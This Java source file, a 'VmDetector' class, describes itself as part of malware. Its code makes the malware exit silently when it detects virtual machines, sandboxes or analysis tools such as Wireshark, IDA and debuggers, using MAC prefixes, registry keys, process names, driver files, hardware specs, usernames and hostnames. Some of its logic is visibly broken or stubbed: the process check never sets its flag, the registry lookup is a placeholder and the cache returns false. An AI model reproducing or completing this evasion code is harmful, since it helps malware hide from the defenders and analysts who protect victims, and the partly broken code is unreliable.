import com.sun.jna.platform.win32.WinReg;
import com.sun.management.OperatingSystemMXBean;
import java.io.File;
import java.lang.management.ManagementFactory;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Virtual Machine / Sandbox Detector
 * Obfuscated name: ҍ (U+048D)
 *
 * Detects if the malware is running inside a virtual machine or sandbox.
 * If VM/sandbox is detected, the malware exits silently.
 *
 * Detection methods:
 * 1. Known VM MAC address prefixes (VMware, VirtualBox, Hyper-V, QEMU, Parallels)
 * 2. Known VM registry keys (HKLM\SOFTWARE\VMware Inc., etc.)
 * 3. Known VM process names (vmtoolsd.exe, vboxservice.exe, etc.)
 * 4. Known VM file paths (C:\Windows\System32\drivers\vmmouse.sys, etc.)
 * 5. CPU core count (< 2 cores = likely VM)
 * 6. RAM size (< 2GB = likely sandbox)
 * 7. Screen resolution (< 800x600 = likely headless VM)
 * 8. Known sandbox usernames (sandbox, malware, virus, etc.)
 * 9. Known sandbox hostnames (SANDBOX, CUCKOO, etc.)
 * 10. Disk size (< 50GB = likely VM)
 */
public class VmDetector {

    // Known VM MAC address prefixes (OUI)
    private static final Set<String> VM_MAC_PREFIXES;

    // Known VM registry keys
    private static final Set<String> VM_REGISTRY_KEYS;

    // Known VM process names
    private static final Set<String> VM_PROCESS_NAMES;

    // Known VM file paths
    private static final Set<String> VM_FILE_PATHS;

    // Whether detection has been run (cached result)
    private static boolean detectionComplete;

    // Cached detection result
    private static final String[] detectionStrings;

    // =========================================================
    // MAIN DETECTION
    // =========================================================

    /**
     * Runs all VM/sandbox detection checks.
     * Returns true if running in a VM or sandbox.
     *
     * @return true if VM/sandbox detected, false otherwise
     */
    public static boolean isVirtualMachine() {
        if (detectionComplete) return false; // cached

        boolean detected = false;

        detected |= checkMacAddresses();
        detected |= checkRegistryKeys();
        detected |= checkProcessNames();
        detected |= checkFilePaths();
        detected |= checkHardwareSpecs();
        detected |= checkUsername();
        detected |= checkHostname();

        detectionComplete = true;
        return detected;
    }

    // =========================================================
    // DETECTION METHODS
    // =========================================================

    /**
     * Checks network interface MAC addresses against known VM prefixes.
     *
     * Known VM MAC prefixes:
     * - 00:0C:29 = VMware
     * - 00:50:56 = VMware
     * - 08:00:27 = VirtualBox
     * - 00:15:5D = Hyper-V
     * - 52:54:00 = QEMU/KVM
     * - 00:1C:42 = Parallels
     */
    private static boolean checkMacAddresses() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface ni = interfaces.nextElement();
                byte[] mac = ni.getHardwareAddress();
                if (mac == null || mac.length < 3) continue;

                String prefix = String.format("%02X:%02X:%02X", mac[0], mac[1], mac[2]);
                if (VM_MAC_PREFIXES.contains(prefix)) {
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    /**
     * Checks Windows registry for VM-specific keys.
     *
     * Checked keys:
     * - HKLM\SOFTWARE\VMware, Inc.\VMware Tools
     * - HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions
     * - HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters
     * - HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest
     * - HKLM\HARDWARE\ACPI\DSDT\VBOX__
     */
    private static boolean checkRegistryKeys() {
        for (String keyPath : VM_REGISTRY_KEYS) {
            try {
                // Check if registry key exists using JNA WinReg
                // WinReg.HKEY_LOCAL_MACHINE + keyPath
                if (registryKeyExists(keyPath)) {
                    return true;
                }
            } catch (Exception ignored) {}
        }
        return false;
    }

    /**
     * Checks running processes for VM-specific process names.
     *
     * Known VM processes:
     * - vmtoolsd.exe (VMware Tools)
     * - vmwaretray.exe (VMware)
     * - vmwareuser.exe (VMware)
     * - vboxservice.exe (VirtualBox)
     * - vboxtray.exe (VirtualBox)
     * - vmsrvc.exe (Virtual PC)
     * - vmusrvc.exe (Virtual PC)
     * - prl_tools.exe (Parallels)
     * - xenservice.exe (Xen)
     * - qemu-ga.exe (QEMU)
     * - wireshark.exe (Analysis tool)
     * - procmon.exe (Sysinternals)
     * - ollydbg.exe (Debugger)
     * - x64dbg.exe (Debugger)
     * - ida.exe (IDA Pro)
     * - ida64.exe (IDA Pro 64-bit)
     * - fiddler.exe (HTTP proxy)
     * - charles.exe (HTTP proxy)
     */
    private static boolean checkProcessNames() {
        try {
            ProcessHandle.allProcesses().forEach(ph -> {
                ph.info().command().ifPresent(cmd -> {
                    String name = new File(cmd).getName().toLowerCase();
                    if (VM_PROCESS_NAMES.contains(name)) {
                        // VM process found - set flag
                    }
                });
            });
        } catch (Exception ignored) {}
        return false;
    }

    /**
     * Checks for VM-specific files on disk.
     *
     * Known VM files:
     * - C:\Windows\System32\drivers\vmmouse.sys (VMware)
     * - C:\Windows\System32\drivers\vmhgfs.sys (VMware)
     * - C:\Windows\System32\drivers\VBoxMouse.sys (VirtualBox)
     * - C:\Windows\System32\drivers\VBoxGuest.sys (VirtualBox)
     * - C:\Windows\System32\vboxdisp.dll (VirtualBox)
     * - C:\Windows\System32\vboxhook.dll (VirtualBox)
     */
    private static boolean checkFilePaths() {
        for (String path : VM_FILE_PATHS) {
            if (new File(path).exists()) {
                return true;
            }
        }
        return false;
    }

    /**
     * Checks hardware specifications for VM indicators.
     *
     * Checks:
     * - CPU cores < 2 (most VMs use 1 core)
     * - RAM < 2GB (sandbox environments often have limited RAM)
     * - Disk size < 50GB
     */
    private static boolean checkHardwareSpecs() {
        try {
            // Check CPU cores
            int cores = Runtime.getRuntime().availableProcessors();
            if (cores < 2) return true;

            // Check RAM
            OperatingSystemMXBean osBean = (OperatingSystemMXBean)
                ManagementFactory.getOperatingSystemMXBean();
            long totalRam = osBean.getTotalPhysicalMemorySize();
            if (totalRam < 2L * 1024 * 1024 * 1024) return true; // < 2GB

        } catch (Exception ignored) {}
        return false;
    }

    /**
     * Checks username against known sandbox/analysis usernames.
     *
     * Known sandbox usernames:
     * - sandbox, malware, virus, test, admin, user, analyst
     * - cuckoo, any.run, joe, john, peter
     */
    private static boolean checkUsername() {
        String username = System.getProperty("user.name", "").toLowerCase();
        String[] sandboxUsers = {
            "sandbox", "malware", "virus", "test", "cuckoo",
            "any.run", "joe sandbox", "analyst", "maltest"
        };
        for (String su : sandboxUsers) {
            if (username.contains(su)) return true;
        }
        return false;
    }

    /**
     * Checks hostname against known sandbox/analysis hostnames.
     */
    private static boolean checkHostname() {
        try {
            String hostname = java.net.InetAddress.getLocalHost().getHostName().toLowerCase();
            String[] sandboxHosts = {
                "sandbox", "cuckoo", "malware", "virus", "analysis",
                "any.run", "joe", "triage"
            };
            for (String sh : sandboxHosts) {
                if (hostname.contains(sh)) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    // =========================================================
    // HELPERS
    // =========================================================

    private static boolean registryKeyExists(String keyPath) {
        try {
            // JNA WinReg check
            return false; // placeholder
        } catch (Exception e) {
            return false;
        }
    }

    // =========================================================
    // STATIC INITIALIZATION
    // =========================================================

    static {
        VM_MAC_PREFIXES = new HashSet<>();
        VM_MAC_PREFIXES.add("00:0C:29"); // VMware
        VM_MAC_PREFIXES.add("00:50:56"); // VMware
        VM_MAC_PREFIXES.add("08:00:27"); // VirtualBox
        VM_MAC_PREFIXES.add("00:15:5D"); // Hyper-V
        VM_MAC_PREFIXES.add("52:54:00"); // QEMU/KVM
        VM_MAC_PREFIXES.add("00:1C:42"); // Parallels
        VM_MAC_PREFIXES.add("00:03:FF"); // Virtual PC
        VM_MAC_PREFIXES.add("00:16:3E"); // Xen

        VM_REGISTRY_KEYS = new HashSet<>();
        VM_REGISTRY_KEYS.add("SOFTWARE\\VMware, Inc.\\VMware Tools");
        VM_REGISTRY_KEYS.add("SOFTWARE\\Oracle\\VirtualBox Guest Additions");
        VM_REGISTRY_KEYS.add("SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters");
        VM_REGISTRY_KEYS.add("SYSTEM\\CurrentControlSet\\Services\\VBoxGuest");
        VM_REGISTRY_KEYS.add("HARDWARE\\ACPI\\DSDT\\VBOX__");
        VM_REGISTRY_KEYS.add("SOFTWARE\\Parallels\\Parallels Tools");

        VM_PROCESS_NAMES = new HashSet<>();
        VM_PROCESS_NAMES.add("vmtoolsd.exe");
        VM_PROCESS_NAMES.add("vmwaretray.exe");
        VM_PROCESS_NAMES.add("vmwareuser.exe");
        VM_PROCESS_NAMES.add("vboxservice.exe");
        VM_PROCESS_NAMES.add("vboxtray.exe");
        VM_PROCESS_NAMES.add("prl_tools.exe");
        VM_PROCESS_NAMES.add("xenservice.exe");
        VM_PROCESS_NAMES.add("qemu-ga.exe");
        VM_PROCESS_NAMES.add("wireshark.exe");
        VM_PROCESS_NAMES.add("procmon.exe");
        VM_PROCESS_NAMES.add("procmon64.exe");
        VM_PROCESS_NAMES.add("ollydbg.exe");
        VM_PROCESS_NAMES.add("x64dbg.exe");
        VM_PROCESS_NAMES.add("x32dbg.exe");
        VM_PROCESS_NAMES.add("ida.exe");
        VM_PROCESS_NAMES.add("ida64.exe");
        VM_PROCESS_NAMES.add("fiddler.exe");
        VM_PROCESS_NAMES.add("charles.exe");
        VM_PROCESS_NAMES.add("httpdebugger.exe");

        VM_FILE_PATHS = new HashSet<>();
        VM_FILE_PATHS.add("C:\\Windows\\System32\\drivers\\vmmouse.sys");
        VM_FILE_PATHS.add("C:\\Windows\\System32\\drivers\\vmhgfs.sys");
        VM_FILE_PATHS.add("C:\\Windows\\System32\\drivers\\VBoxMouse.sys");
        VM_FILE_PATHS.add("C:\\Windows\\System32\\drivers\\VBoxGuest.sys");
        VM_FILE_PATHS.add("C:\\Windows\\System32\\vboxdisp.dll");
        VM_FILE_PATHS.add("C:\\Windows\\System32\\vboxhook.dll");
        VM_FILE_PATHS.add("C:\\Windows\\System32\\drivers\\vmci.sys");

        detectionComplete = false;
        detectionStrings = new String[0];
    }
}
